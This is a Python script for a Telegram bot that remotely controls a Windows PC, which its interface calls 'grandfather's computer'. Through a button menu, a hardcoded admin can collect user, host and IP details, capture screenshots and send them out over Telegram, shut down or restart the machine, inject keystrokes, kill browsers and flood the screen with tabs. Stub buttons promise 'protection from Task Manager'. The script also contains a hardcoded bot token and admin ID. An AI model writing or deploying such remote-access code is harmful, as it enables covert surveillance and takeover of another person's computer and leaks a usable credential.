# -*- coding: utf-8 -*-
import telebot
import os
import sys
import time
import getpass
import platform
import socket
import uuid
import subprocess
from threading import Thread
import datetime
import threading
import json
import hashlib
import psutil

# ========== ТВОИ ДАННЫЕ ==========
BOT_TOKEN = '8689333512:AAE1XY-yWka5xvyN-IIgnH5cy47eB_ug5xU'
ADMIN_ID = 8527578981
# ================================

IS_WINDOWS = platform.system() == "Windows"

class PCManager:
    def __init__(self):
        self.pc_id = self.get_pc_id()
        self.pc_name = socket.gethostname()
        self.user_name = getpass.getuser()
        self.last_command = None
        
    def get_pc_id(self):
        mac = uuid.getnode()
        return f"PC_{self.get_pc_name()}_{mac % 10000}"
    
    def get_pc_name(self):
        return socket.gethostname()
    
    def get_system_info(self):
        info = {
            'id': self.pc_id,
            'computer': self.pc_name,
            'user': self.user_name,
            'local_ip': socket.gethostbyname(socket.gethostname()),
            'os': platform.system() + ' ' + platform.release(),
            'last_seen': time.strftime('%H:%M %d.%m.%Y')
        }
        return info

pc = PCManager()
bot = telebot.TeleBot(BOT_TOKEN)

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def windows_only(message):
    """Отправляет сообщение, что функция доступна только на Windows"""
    bot.send_message(message.chat.id, "❌ Эта функция доступна только на компьютере дедушки (Windows)")

def press_key(key):
    if IS_WINDOWS:
        try:
            import pyautogui
            pyautogui.press(key)
            return True
        except:
            return False
    return False

def hotkey(*keys):
    if IS_WINDOWS:
        try:
            import pyautogui
            pyautogui.hotkey(*keys)
            return True
        except:
            return False
    return False

# ========== КОМАНДА СТАРТ ==========
@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Доступ запрещен")
        return
    
    from telebot.types import ReplyKeyboardMarkup, KeyboardButton
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    # ===== ВСЕ 30+ КНОПОК =====
    buttons = [
        KeyboardButton('🟢 Статус'),
        KeyboardButton('🔴 Выключить'),
        KeyboardButton('🔄 Перезагрузить'),
        KeyboardButton('🔒 Блокировка ПК'),
        KeyboardButton('🔐 Статус блокировки'),
        KeyboardButton('📸 Скриншот'),
        KeyboardButton('🛡️ Защита от диспетчера'),
        KeyboardButton('🔓 Снять защиту диспетчера'),
        KeyboardButton('❌ Закрыть окно (ALT+F4)'),
        KeyboardButton('↩️ Отмена (Ctrl+Z)'),
        KeyboardButton('📋 Копировать (Ctrl+C)'),
        KeyboardButton('📌 Вставить (Ctrl+V)'),
        KeyboardButton('⏎ Enter'),
        KeyboardButton('␣ Пробел'),
        KeyboardButton('⎋ Esc'),
        KeyboardButton('⬆️ Вверх'),
        KeyboardButton('⬇️ Вниз'),
        KeyboardButton('⬅️ Влево'),
        KeyboardButton('➡️ Вправо'),
        KeyboardButton('🔊 Громче'),
        KeyboardButton('🔉 Тише'),
        KeyboardButton('🔇 Выключить звук'),
        KeyboardButton('🏠 Рабочий стол (Win+D)'),
        KeyboardButton('🔒 Заблокировать (Win+L)'),
        KeyboardButton('🔄 Переключить окно'),
        KeyboardButton('🌐 Открыть браузер'),
        KeyboardButton('❌ Закрыть браузер'),
        KeyboardButton('📂 30 вкладок'),
        KeyboardButton('🔍 Поиск'),
        KeyboardButton('📋 Список ПК'),
        KeyboardButton('📊 Диспетчер'),
    ]
    
    markup.add(*buttons)
    
    platform_info = "🖥️ Render (облако)" if not IS_WINDOWS else f"💻 {pc.pc_name}"
    
    bot.send_message(
        message.chat.id,
        f"✅ Управление компьютером\n{platform_info}\n\n"
        f"🆔 ID: {pc.pc_id}\n"
        f"{'⚠️ Некоторые функции доступны только на Windows' if not IS_WINDOWS else ''}",
        reply_markup=markup
    )

# ========== БАЗОВЫЕ ФУНКЦИИ ==========
@bot.message_handler(func=lambda m: m.text == '🟢 Статус')
def status(message):
    if message.chat.id == ADMIN_ID:
        info = pc.get_system_info()
        bot.send_message(
            message.chat.id,
            f"🟢 Компьютер в сети\n"
            f"Последняя активность: {info['last_seen']}\n"
            f"💻 {info['computer']} | 👤 {info['user']}\n"
            f"🌐 IP: {info['local_ip']}\n"
            f"🖥️ ОС: {info['os']}"
        )

@bot.message_handler(func=lambda m: m.text == '🔴 Выключить')
def shutdown(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            bot.send_message(message.chat.id, "🔴 Выключение через 10 секунд...")
            time.sleep(2)
            os.system("shutdown /s /t 10")
        else:
            bot.send_message(message.chat.id, "❌ Выключение доступно только на Windows")

@bot.message_handler(func=lambda m: m.text == '🔄 Перезагрузить')
def restart(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            bot.send_message(message.chat.id, "🔄 Перезагрузка через 10 секунд...")
            time.sleep(2)
            os.system("shutdown /r /t 10")
        else:
            bot.send_message(message.chat.id, "❌ Перезагрузка доступна только на Windows")

@bot.message_handler(func=lambda m: m.text == '📸 Скриншот')
def screenshot(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            try:
                import pyautogui
                bot.send_message(message.chat.id, "📸 Делаю скриншот...")
                filename = f"screenshot_{int(time.time())}.png"
                pyautogui.screenshot().save(filename)
                with open(filename, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo)
                os.remove(filename)
            except:
                bot.send_message(message.chat.id, "❌ Ошибка скриншота")
        else:
            bot.send_message(message.chat.id, "📸 Скриншот доступен только на Windows")

# ========== БЛОКИРОВКА (ТОЛЬКО Windows) ==========
@bot.message_handler(func=lambda m: m.text == '🔒 Блокировка ПК')
def lock_pc(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            bot.send_message(message.chat.id, "🔒 Функция блокировки доступна в локальном EXE на компьютере дедушки")
        else:
            bot.send_message(message.chat.id, "🔒 Блокировка работает только на Windows")

@bot.message_handler(func=lambda m: m.text == '🔐 Статус блокировки')
def lock_status(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            bot.send_message(message.chat.id, "🔐 Статус блокировки доступен в локальном EXE")
        else:
            bot.send_message(message.chat.id, "🔐 На Render нет функции блокировки")

# ========== ЗАЩИТА ОТ ДИСПЕТЧЕРА ==========
@bot.message_handler(func=lambda m: m.text == '🛡️ Защита от диспетчера')
def enable_anti(message):
    windows_only(message)

@bot.message_handler(func=lambda m: m.text == '🔓 Снять защиту диспетчера')
def disable_anti(message):
    windows_only(message)

# ========== КЛАВИАТУРНЫЕ ПОМОЩНИКИ ==========
@bot.message_handler(func=lambda m: m.text == '❌ Закрыть окно (ALT+F4)')
def alt_f4(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            hotkey('alt', 'f4')
            bot.send_message(message.chat.id, "❌ Окно закрыто")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '↩️ Отмена (Ctrl+Z)')
def ctrl_z(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            hotkey('ctrl', 'z')
            bot.send_message(message.chat.id, "↩️ Отмена выполнена")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '📋 Копировать (Ctrl+C)')
def ctrl_c(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            hotkey('ctrl', 'c')
            bot.send_message(message.chat.id, "📋 Скопировано")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '📌 Вставить (Ctrl+V)')
def ctrl_v(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            hotkey('ctrl', 'v')
            bot.send_message(message.chat.id, "📌 Вставлено")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '⏎ Enter')
def press_enter(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            press_key('enter')
            bot.send_message(message.chat.id, "⏎ Enter нажат")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '␣ Пробел')
def press_space(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            press_key('space')
            bot.send_message(message.chat.id, "␣ Пробел нажат")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '⎋ Esc')
def press_esc(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            press_key('esc')
            bot.send_message(message.chat.id, "⎋ Esc нажат")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '⬆️ Вверх')
def up(message):
    if message.chat.id == ADMIN_ID and IS_WINDOWS:
        press_key('up')

@bot.message_handler(func=lambda m: m.text == '⬇️ Вниз')
def down(message):
    if message.chat.id == ADMIN_ID and IS_WINDOWS:
        press_key('down')

@bot.message_handler(func=lambda m: m.text == '⬅️ Влево')
def left(message):
    if message.chat.id == ADMIN_ID and IS_WINDOWS:
        press_key('left')

@bot.message_handler(func=lambda m: m.text == '➡️ Вправо')
def right(message):
    if message.chat.id == ADMIN_ID and IS_WINDOWS:
        press_key('right')

# ========== УПРАВЛЕНИЕ ЗВУКОМ ==========
@bot.message_handler(func=lambda m: m.text == '🔊 Громче')
def volume_up(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            for _ in range(5):
                press_key('volumeup')
            bot.send_message(message.chat.id, "🔊 Громкость увеличена")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '🔉 Тише')
def volume_down(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            for _ in range(5):
                press_key('volumedown')
            bot.send_message(message.chat.id, "🔉 Громкость уменьшена")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '🔇 Выключить звук')
def mute(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            press_key('volumemute')
            bot.send_message(message.chat.id, "🔇 Звук выключен")
        else:
            windows_only(message)

# ========== УПРАВЛЕНИЕ ОКНАМИ ==========
@bot.message_handler(func=lambda m: m.text == '🏠 Рабочий стол (Win+D)')
def show_desktop(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            hotkey('win', 'd')
            bot.send_message(message.chat.id, "🏠 Рабочий стол показан")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '🔒 Заблокировать (Win+L)')
def win_lock(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            hotkey('win', 'l')
            bot.send_message(message.chat.id, "🔒 Компьютер заблокирован")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '🔄 Переключить окно')
def alt_tab(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            hotkey('alt', 'tab')
            bot.send_message(message.chat.id, "🔄 Окно переключено")
        else:
            windows_only(message)

# ========== БРАУЗЕР ==========
@bot.message_handler(func=lambda m: m.text == '🌐 Открыть браузер')
def browser_open(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            os.system("start https://google.com")
            bot.send_message(message.chat.id, "🌐 Браузер открыт")
        else:
            bot.send_message(message.chat.id, "🌐 Функция открытия браузера доступна только на Windows")

@bot.message_handler(func=lambda m: m.text == '❌ Закрыть браузер')
def browser_close(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            os.system("taskkill /f /im chrome.exe 2>nul")
            os.system("taskkill /f /im msedge.exe 2>nul")
            os.system("taskkill /f /im firefox.exe 2>nul")
            bot.send_message(message.chat.id, "❌ Браузеры закрыты")
        else:
            windows_only(message)

@bot.message_handler(func=lambda m: m.text == '📂 30 вкладок')
def thirty_tabs(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            bot.send_message(message.chat.id, "📂 Открываю 30 вкладок...")
            for i in range(30):
                os.system(f"start https://google.com/search?q=страница+{i+1}")
                time.sleep(0.2)
            bot.send_message(message.chat.id, "✅ 30 вкладок открыто")
        else:
            windows_only(message)

# ========== ПОИСК ==========
@bot.message_handler(func=lambda m: m.text == '🔍 Поиск')
def search(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            msg = bot.send_message(message.chat.id, "🔍 Введи запрос:")
            bot.register_next_step_handler(msg, process_search)
        else:
            msg = bot.send_message(message.chat.id, "🔍 Введи запрос (на Windows откроется браузер):")
            bot.register_next_step_handler(msg, process_search)

def process_search(message):
    query = message.text.strip()
    if IS_WINDOWS:
        url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
        os.system(f"start {url}")
        bot.send_message(message.chat.id, f"🔍 Ищем: {query}")
    else:
        bot.send_message(message.chat.id, f"🔍 Запрос: {query}\n(на Windows откроется браузер)")

# ========== СПИСОК ПК И ДИСПЕТЧЕР ==========
@bot.message_handler(func=lambda m: m.text == '📋 Список ПК')
def list_pcs(message):
    if message.chat.id == ADMIN_ID:
        info = pc.get_system_info()
        bot.send_message(
            message.chat.id,
            f"📋 **Информация о системе**\n"
            f"💻 Имя: {info['computer']}\n"
            f"👤 Пользователь: {info['user']}\n"
            f"🌐 IP: {info['local_ip']}\n"
            f"🆔 ID: {info['id']}",
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda m: m.text == '📊 Диспетчер')
def task_manager(message):
    if message.chat.id == ADMIN_ID:
        if IS_WINDOWS:
            os.system("taskmgr")
            bot.send_message(message.chat.id, "📊 Диспетчер задач открыт")
        else:
            bot.send_message(message.chat.id, "📊 Диспетчер задач доступен только на Windows")

# ========== ЗАПУСК ==========
def main():
    print(f"🤖 Render бот запущен... (Платформа: {platform.system()})")
    print(f"✅ Доступно {'ВСЕ' if IS_WINDOWS else 'ОСНОВНЫЕ'} функции")
    while True:
        try:
            bot.polling(non_stop=True, interval=0)
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
